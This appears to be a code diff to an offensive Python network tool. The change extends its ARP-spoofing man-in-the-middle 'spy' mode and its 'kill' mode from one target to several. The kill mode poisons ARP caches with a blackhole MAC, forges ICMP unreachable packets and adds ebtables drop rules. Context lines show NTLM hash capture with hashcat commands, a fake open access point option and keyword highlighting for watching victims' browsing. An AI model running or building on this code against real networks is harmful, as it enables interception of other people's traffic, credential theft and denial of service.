@@ -134,14 +134,14 @@ ip_info_cache = {}
 found_hosts = []
 seen_hosts = {}
 
-victim_ip = ""
+victim_ips = set()
 gateway_ips = set()
 
 
 iface_spy = ""
 
-victim_mac = None
-gateway_mac = None
+gateway_macs = {}
+victim_macs = {}
 
 start_iface = ""
 
@@ -181,12 +181,12 @@ def signal_handler(sig, frame): # Ctrl+C cleint discovery & scanning stuff
     restore_arp()
     sys.exit(0)
 
-def signal_handler2(sig, frame): # Ctrl+C kill client connexion ARP
+def signal_handler2(sig, frame):
     print(f"\n[*] {R}Ctrl + C detected. Closing ...{RESET}")
     restore_arp()
-    # Clean up ebtables rules if possible
-    os.system(f"ebtables -D OUTPUT -p IPv4 --ip-src {victim_ip} -j DROP")
-    os.system(f"ebtables -D FORWARD -p IPv4 --ip-src {victim_ip} -j DROP")
+    for v_ip in victim_ips:
+        os.system(f"ebtables -D OUTPUT -p IPv4 --ip-src {v_ip} -j DROP")
+        os.system(f"ebtables -D FORWARD -p IPv4 --ip-src {v_ip} -j DROP")
     print(f"[*] Ebtables rules removed{RESET}")
     sys.exit(0)
 
@@ -242,10 +242,19 @@ def highlight_keywords(text):
 
 ########################## SPY MODE (--spy) ##########################
 def get_mac(ip):
-    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
+    ans, _ = sr(ARP(pdst=ip), timeout=6, verbose=0)
     for _, rcv in ans:
         return rcv.hwsrc
-    return None
+
+    print(f"[!] MAC not found for {ip}. Enter manually (format XX:XX:XX:XX:XX:XX) or 'skip':")
+    while True:
+        mac = input(f"    {ip} > ").strip().lower()
+        if mac == "skip":
+            return None
+        if re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", mac):
+            return mac
+        print("[!] Invalid MAC format. Try again or 'skip'.")
+
 
 # Setup passive MITM config
 def enable_ip_forwarding():
@@ -255,10 +264,20 @@ def enable_ip_forwarding():
     os.system("iptables -t nat -A POSTROUTING -o {} -j MASQUERADE".format(iface_spy))
 
 
-gateway_macs = {}
 def spoof():
-    global victim_mac, gateway_ips, gateway_macs
-    victim_mac = get_mac(victim_ip)
+    global victim_macs, gateway_ips, gateway_macs
+    for ip in sorted(victim_ips):
+        mac = get_mac(ip)
+        if mac:
+            victim_macs[ip] = mac
+            print(f"[+] Target {ip} -> {mac}")
+        else:
+            print(f"[-] MAC not found for target {ip}")
+
+    if not victim_macs:
+        print(f"[-] {R}No target MAC addresses found. Exiting{RESET}")
+        exit(1)
+
     for gw_ip in gateway_ips:
         gw_mac = get_mac(gw_ip)
         if gw_mac:
@@ -267,18 +286,19 @@ def spoof():
         else:
             print(f"[-] MAC not found for {gw_ip}, skipping")
 
-    if not victim_mac or not gateway_macs:
+    if not victim_macs or not gateway_macs:
         print(f"[-] {R}MAC not found. Exiting{RESET}")
         exit(1)
 
     print("[*] Starting ARP spoofing...")
     try:
         while True:
-            for gw_ip, gw_mac in gateway_macs.items():
-                pkt_to_victim = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, psrc=gw_ip, hwdst=victim_mac)
-                sendp(pkt_to_victim, iface=iface_spy, verbose=0)
-                pkt_to_gateway = Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=victim_ip, hwdst=gw_mac)
-                sendp(pkt_to_gateway, iface=iface_spy, verbose=0)
+            for v_ip, v_mac in victim_macs.items():
+                for gw_ip, gw_mac in gateway_macs.items():
+                    pkt_to_victim = Ether(dst=v_mac) / ARP(op=2, pdst=v_ip, psrc=gw_ip, hwdst=v_mac)
+                    sendp(pkt_to_victim, iface=iface_spy, verbose=0)
+                    pkt_to_gateway = Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=v_ip, hwdst=gw_mac)
+                    sendp(pkt_to_gateway, iface=iface_spy, verbose=0)
 
             time.sleep(0.3)
     except KeyboardInterrupt:
@@ -288,12 +308,13 @@ def spoof():
 # Restore ARP tables
 def restore_arp():
     print("[!] Restoring ARP tables...")
-    if not victim_mac or not gateway_macs:
+    if not victim_macs or not gateway_macs:
         return
 
-    for gw_ip, gw_mac in gateway_macs.items():
-        sendp(Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, psrc=gw_ip, hwsrc=gw_mac), count=5, iface=iface_spy, verbose=0)
-        sendp(Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=victim_ip, hwsrc=victim_mac), count=5, iface=iface_spy, verbose=0)
+    for v_ip, v_mac in victim_macs.items():
+        for gw_ip, gw_mac in gateway_macs.items():
+            sendp(Ether(dst=v_mac) / ARP(op=2, pdst=v_ip, psrc=gw_ip, hwsrc=gw_mac), count=5, iface=iface_spy, verbose=0)
+            sendp(Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=v_ip, hwsrc=v_mac), count=5, iface=iface_spy, verbose=0)
 
 
 def get_ip_info(ip):
@@ -1278,15 +1299,6 @@ def detect_ntlmssp_auth(packet):
             print(f"    {Y}hashcat -m 100 -a 0 \"{hash_100}\" <wordlist>{RESET}")
         print(f"{'=' * 60}")
 
-
-
-
-
-
-
-
-
-
 SMB2_SIG = b"\xfeSMB"
 SMB2_TRANSFORM_SIG = b"\xfdSMB"
 NETBIOS_SESSION_MESSAGE = 0x00
@@ -1822,6 +1834,15 @@ def process_SSH_packet(packet):
         print(f"[{time.strftime('%H:%M:%S')}] - {MA}[SSH BANNER]{RESET} {src_ip}:{tcp.sport} -> {Y}{dst_ip}:{tcp.dport}{RESET} | {banner}", flush=True)
 
 
+def build_capture_filter(targets):
+    if not targets:
+        raise ValueError("At least one target IP is required")
+
+    conditions = [
+        f"(src host {ip} or dst host {ip})"
+        for ip in sorted(targets)
+    ]
+    return " or ".join(conditions)
 
 
 def sniff_traffic(): # Sniff source & destinations packets from the target
@@ -1901,7 +1922,7 @@ def sniff_traffic(): # Sniff source & destinations packets from the target
             try:
                 if packet.haslayer(UDP) or packet.haslayer(TCP):
                     for ip in (src, dst):
-                        if ip != victim_ip and not ip.startswith("fe80"):
+                        if ip not in victim_ips and not ip.startswith("fe80"):
                             if "IP" not in PACKET_FILTER:
                                 handle_external_ip(ip)
             except Exception as e:
@@ -1916,9 +1937,8 @@ def sniff_traffic(): # Sniff source & destinations packets from the target
         except Exception as e:
             print(f"[ERROR-PACKET] {type(e).__name__}: {e}")
 
-    sniff(filter=f"(ip src {victim_ip} or ip dst {victim_ip})", prn=handle_packet, store=0, iface=iface_spy) # Source + Destination filter
-    
-
+    capture_filter = build_capture_filter(victim_ips)
+    sniff(filter=capture_filter, prn=handle_packet, store=0, iface=iface_spy)    
 
 
 ########################## CONNECT DISCOVERY MODE (--connect) ##########################
@@ -2996,8 +3016,19 @@ def print_devices(devices):
 
 ########################## KILL CONNEXION MODE (--kill) ##########################
 def kill_connection():
-    global victim_mac, gateway_macs
-    victim_mac = get_mac(victim_ip)
+    global victim_macs, gateway_macs
+    for v_ip in victim_ips:
+        mac = get_mac(v_ip)
+        if mac:
+            victim_macs[v_ip] = mac
+            print(f"[+] Target {v_ip} -> {mac}")
+        else:
+            print(f"[-] MAC not found for target {v_ip}")
+
+    if not victim_macs:
+        print(f"[-] {R}No target MAC found. Exiting{RESET}")
+        exit(1)
+
     for gw_ip in gateway_ips:
         gw_mac = get_mac(gw_ip)
         if gw_mac:
@@ -3006,17 +3037,19 @@ def kill_connection():
         else:
             print(f"[-] MAC not found for {gw_ip}, skipping")
 
-    if not victim_mac or not gateway_macs:
-        print(f"[-] {R}MAC not found. Exiting{RESET}")
+    if not gateway_macs:
+        print(f"[-] {R}No gateway MAC found. Exiting{RESET}")
         exit(1)
 
     print("[*] ARP spoof with KILL mode: Killing target connexion ...")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     blackhole_mac = "00:00:00:00:00:00"
 
+    # ebtables
     try:
-        os.system(f"ebtables -A OUTPUT -p IPv4 --ip-src {victim_ip} -j DROP")
-        os.system(f"ebtables -A FORWARD -p IPv4 --ip-src {victim_ip} -j DROP")
+        for v_ip in victim_ips:
+            os.system(f"ebtables -A OUTPUT -p IPv4 --ip-src {v_ip} -j DROP")
+            os.system(f"ebtables -A FORWARD -p IPv4 --ip-src {v_ip} -j DROP")
         print("[*] ebtables: rules set")
     except Exception:
         print(f"[!] {R}ebtables not disponible ... Check installation{RESET}")
@@ -3024,25 +3057,22 @@ def kill_connection():
     try:
         print(f"[*] {Y}Attack running ...{RESET}")
         while True:
-            for gw_ip, gw_mac in gateway_macs.items():
-                # ARP poisoning victim
-                pkt_to_victim = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, psrc=gw_ip, hwsrc=blackhole_mac, hwdst=victim_mac)
-                sendp(pkt_to_victim, iface=iface_spy, verbose=0)
-
-                # ARP poisoning gateway
-                pkt_to_gateway = Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=victim_ip, hwsrc=blackhole_mac, hwdst=gw_mac)
-                sendp(pkt_to_gateway, iface=iface_spy, verbose=0)
-
-                # ICMP Host Unreachable (un par gateway)
-                icmp_unreachable = Ether(dst=gw_mac) / IP(dst=victim_ip, src=gw_ip) / ICMP(type=3, code=1)
-                sendp(icmp_unreachable, iface=iface_spy, verbose=0)
+            for v_ip, v_mac in victim_macs.items():
+                for gw_ip, gw_mac in gateway_macs.items():
+                    pkt_to_victim = Ether(dst=v_mac) / ARP(op=2, pdst=v_ip, psrc=gw_ip, hwsrc=blackhole_mac, hwdst=v_mac)
+                    sendp(pkt_to_victim, iface=iface_spy, verbose=0)
+                    pkt_to_gateway = Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=v_ip, hwsrc=blackhole_mac, hwdst=gw_mac)
+                    sendp(pkt_to_gateway, iface=iface_spy, verbose=0)
+                    icmp_unreachable = Ether(dst=gw_mac) / IP(dst=v_ip, src=gw_ip) / ICMP(type=3, code=1)
+                    sendp(icmp_unreachable, iface=iface_spy, verbose=0)
 
             time.sleep(0.2)
     except KeyboardInterrupt:
         print(f"\n[*] {R}Ctrl + C detected. Closing ...{RESET}")
         restore_arp()
-        os.system(f"ebtables -D OUTPUT -p IPv4 --ip-src {victim_ip} -j DROP")
-        os.system(f"ebtables -D FORWARD -p IPv4 --ip-src {victim_ip} -j DROP")
+        for v_ip in victim_ips:
+            os.system(f"ebtables -D OUTPUT -p IPv4 --ip-src {v_ip} -j DROP")
+            os.system(f"ebtables -D FORWARD -p IPv4 --ip-src {v_ip} -j DROP")
         print("[*] Ebtables rules removed")
         sys.exit(0)
 
@@ -3378,7 +3408,7 @@ def cleanup(signal_received=None, frame=None):
 
 ########################## MAIN ##########################
 def main():
-    global victim_ip, gateway_ips, iface_spy, start_iface, karma_interface, INTERNET_INTERFACE, ESSID_fakeAP, highlight_keywords_list, current_channel, summary, MY_IP, PACKET_FILTER, EXCLUDE_SMB_FOLDERS
+    global victim_ips, gateway_ips, iface_spy, start_iface, karma_interface, INTERNET_INTERFACE, ESSID_fakeAP, highlight_keywords_list, current_channel, summary, MY_IP, PACKET_FILTER, EXCLUDE_SMB_FOLDERS
     print(banner)
     parser = argparse.ArgumentParser(description="Silence reveals what noise conceals")
     parser.add_argument("--network", "-n", help="IP range to scan (e.g., 192.168.1.0/24)")
@@ -3390,8 +3420,8 @@ def main():
     parser.add_argument("-es", help="Exclude smb folders content (enum only shares on SMB packets)", action='store_true')
     parser.add_argument("--highlight", "-hi", help="Keywords to highlight during --spy observation (ex : --highlight tinder,badoo,grindr,pornhub or : --highlight sentinelone,crowdstrike,company)", type=str)
     parser.add_argument("--kill", "-k", help="Kill ARP connexion from target (--target, --router, and --interface required)", action='store_true')
-    parser.add_argument("--target", "-t", help="Target IP to monitor")
-    parser.add_argument("--router", "-r", action="append", dest="routers", default=[], metavar="IP",help="Network router IP (Supports multiple route: -r 192.168.1.5 -r 192.168.1.254)")
+    parser.add_argument("--target", "-t", action="append", dest="targets", default=[], metavar="IP", help="Target IP to monitor (Supports multiple targets with a single router: -t 192.168.1.50 -t 192.168.1.51. Use only one -r when specifying multiple -t options.)")
+    parser.add_argument("--router", "-r", action="append", dest="routers", default=[], metavar="IP",help="Network router IP (Supports multiple routers with a single target: -r 192.168.1.5 -r 192.168.1.254. Use only one -t when specifying multiple -r options.)")
     parser.add_argument("--interface", "-i", help="Network interface to use (e.g., eth0)")
     parser.add_argument("--karma-scan", "-ks", help="Sniff probe requests and show ESSIDs + MACs with --karma-interface", action="store_true")
     parser.add_argument("--karma", "-ka", help="Setup fake OPEN AP (Insert probed ESSID from karma attack for exemple). --karma ESSID_NAME (need an other interface : --karma-interface). Use --kill-karma to end AP")
@@ -3416,6 +3446,9 @@ def main():
 
     if args.usages:
         print(Debug_display)
+
+    if len(args.targets) > 1 and len(args.routers) > 1:
+        parser.error("Invalid arguments: use either multiple --target with a single --router, or multiple --router with a single --target.")
 
     if args.highlight:
         highlight_keywords_list = [w.strip().lower() for w in args.highlight.split(",")]
@@ -3481,7 +3514,7 @@ def main():
         thread_sniff.join()
 
     if args.kill:
-        if not args.target:
+        if not args.targets:
             print(f"[!] {R}Missing argument: --target")
             exit(1)
         if not args.routers:
@@ -3491,7 +3524,7 @@ def main():
             print(f"[!] {R}Missing argument: --interface")
             exit(1)
 
-        victim_ip = args.target
+        victim_ips.update(args.targets)
         gateway_ips.update(args.routers)
         iface_spy = args.interface
 
@@ -3499,7 +3532,7 @@ def main():
         kill_connection()
 
     if args.spy:
-        if not args.target:
+        if not args.targets:
             print(f"[!] {R}Missing argument: --target")
             exit(1)
         if not args.routers:
@@ -3509,7 +3542,7 @@ def main():
             print(f"[!] {R}Missing argument: --interface")
             exit(1)
 
-        victim_ip = args.target
+        victim_ips.update(args.targets)
         gateway_ips.update(args.routers)
         iface_spy = args.interface
 
